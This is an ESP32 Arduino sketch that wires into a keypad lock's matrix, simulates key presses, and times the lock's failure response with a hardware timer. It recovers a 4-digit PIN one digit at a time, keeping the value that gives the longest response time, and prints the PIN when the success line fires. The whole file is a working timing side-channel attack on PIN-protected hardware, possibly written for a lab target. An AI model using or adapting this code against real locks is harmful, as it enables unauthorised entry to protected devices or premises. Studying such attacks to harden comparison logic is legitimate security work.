#include <Arduino.h>

#define FAIL_PIN 27
#define SUCCESS_PIN 14
#define PASS_SIZE 4

#define ROW_0 GPIO_NUM_19
#define ROW_1 GPIO_NUM_18
#define ROW_2 GPIO_NUM_5
#define ROW_3 GPIO_NUM_17
#define COL_0 GPIO_NUM_16
#define COL_1 GPIO_NUM_4
#define COL_2 GPIO_NUM_15
#define NO_KEY GPIO_NUM_2 

#define START_PIN GPIO_NUM_26

#define RESET_BUTTON 10
#define ENTER_BUTTON 11
#define TOUCH_DELAY 5

hw_timer_t * timer = NULL;
volatile uint64_t startTime = 0;
volatile uint64_t endTime = 0;
volatile bool measure = false;

void IRAM_ATTR stopTimer();

void IRAM_ATTR startTimer();

byte col = COL_0;
byte row = ROW_2;

void printCol(){
    Serial.printf("%d %d %d\n",
        digitalRead(COL_0),
        digitalRead(COL_1),
        digitalRead(COL_2));
}

byte rowMap(byte num){
    switch (num)
    {
    case 1:
    case 2:
    case 3:
        return ROW_0;
    case 4:
    case 5:
    case 6:
        return ROW_1;
    case 7:
    case 8:
    case 9:
        return ROW_2;
    case RESET_BUTTON:
    case 0:
    case ENTER_BUTTON:
        return ROW_3;
    default:
        return NO_KEY;
    }
}

byte colMap(byte num){
    switch (num)
    {
    case 1:
    case 4:
    case 7:
    case RESET_BUTTON:
        return COL_0;
    case 2:
    case 5:
    case 8:
    case 0:
        return COL_1;
    case 3:
    case 6:
    case 9:
    case ENTER_BUTTON:
        return COL_2;
    default:
        return NO_KEY;
    }
}

void inline waitForChange(){
    while(!digitalRead(COL_0) | !digitalRead(COL_1) | !digitalRead(COL_2)){
        yield();
    }
}

void touch(byte num){
    waitForChange();
    row = rowMap(num);
    col = colMap(num);
}


void inline release(){
    waitForChange();
    row = NO_KEY;
    col = NO_KEY;
    digitalWrite(ROW_0, HIGH);
    digitalWrite(ROW_1, HIGH);
    digitalWrite(ROW_2, HIGH);
    digitalWrite(ROW_3, HIGH);
}

void press(byte num){
    touch(num);
    delay(3);
    release();
    delay(5);
}

void inline reset(){
	press(RESET_BUTTON);
}

void inline enter(){
    waitForChange();
    startTimer();
    row = rowMap(ENTER_BUTTON);
    col = colMap(ENTER_BUTTON);
    waitForChange();
    delay(3);
    release();
    delay(5);
}

void touchHandler(void*){
    taskDISABLE_INTERRUPTS();
    for(;;){
        digitalWrite(row, digitalRead(col));
    }
}
void theEnd();

byte pass[4] = { 0, 0, 0, 0 };
uint64_t sendPassword(uint8_t* password)
{
    for (size_t i = 0; i < PASS_SIZE; i++)
        press(password[i]);
    enter();

	while (measure || startTime == 0 || endTime == 0){ yield(); }
		//Serial.printf("%d ,%" PRIu64 ",%" PRIu64 "\n" , measure, endTime, startTime);

    uint64_t duration = endTime - startTime;
    startTime = 0; // Reset startTime for next measurement
    endTime = 0; // Reset endTime for next measurement

    return duration;
}
void Main(void*){
    Serial.println("Main");


    timer = timerBegin(0, 2, true); // Use timer 0, prescaler 1 (4.17ns per tick), count up

    delay(1000);
	reset();
    reset();
	delay(4000);

    attachInterrupt(digitalPinToInterrupt(FAIL_PIN), stopTimer, RISING);
    attachInterrupt(digitalPinToInterrupt(SUCCESS_PIN), theEnd, RISING);

    const uint8_t initPass[PASS_SIZE] = {0,0,0,0};
    // generate the password each loop iteration
	for(;;){
        memcpy(pass, initPass, PASS_SIZE);

		for (uint8_t index = 0; index < PASS_SIZE; index++)
		{
			uint8_t maxes[10] = {0,0,0,0,0,0,0,0,0,0};
			uint64_t results[10] = {0,0,0,0,0,0,0,0,0,0};
			for (uint8_t i = 0; i < 20; i++){
				uint64_t max_time = 0;
				for (uint8_t j = 0; j < 10; j++)
				{
					pass[index] = j;
					results[j] = sendPassword(pass);
					if(results[j] > max_time)
						max_time = results[j];
				}
				for (uint8_t j = 0; j < 10; j++)
					if(results[j] == max_time)
						maxes[j]++;
			}
			for (uint8_t j = 0; j < 10; j++){
			    Serial.print(maxes[j]);
				Serial.print(" ");
			}
			Serial.println();
			uint8_t max = 0;
			uint8_t maxval = 0;
			for (uint8_t j = 0; j < 10; j++)
			    if(maxes[j] > maxval){
				    max = j;
                    maxval = maxes[j];
                }
			pass[index] = max;
			Serial.println(max);
		}
		Serial.println();
	}
}

void setup() {
    Serial.begin(115200);
    pinMode(FAIL_PIN, INPUT);
    pinMode(SUCCESS_PIN, INPUT);
    pinMode(ROW_0, OUTPUT);
    pinMode(ROW_1, OUTPUT);
    pinMode(ROW_2, OUTPUT);
    pinMode(ROW_3, OUTPUT);
    pinMode(COL_0, INPUT_PULLUP);
    pinMode(COL_1, INPUT_PULLUP);
    pinMode(COL_2, INPUT_PULLUP);
    pinMode(START_PIN, OUTPUT);
    digitalWrite(START_PIN, HIGH);

    xTaskCreatePinnedToCore(
        touchHandler,
        "touch",
        3000,
        NULL,
        1,
        NULL,
        1
    );

    xTaskCreatePinnedToCore(
        Main,
        "Main",
        2000,
        NULL,
        1,
        NULL,
        0
    );

    vTaskDelete(NULL);
}

void loop(){}

// ISR for FAIL_PIN
void IRAM_ATTR stopTimer() {
    if (measure) {
        endTime = timerRead(timer);
        measure = false;
    }
}

void IRAM_ATTR startTimer() {
    if (!measure) {
		//Serial.println("A");
        timerWrite(timer, 0); // Reset the timer
        startTime = timerRead(timer);
        measure = true;
    }
}

void theEnd(){
    Serial.println("The End");
    for (size_t i = 0; i < PASS_SIZE; i++){
        Serial.print(pass[i]);
    }
    vTaskDelete(NULL);
}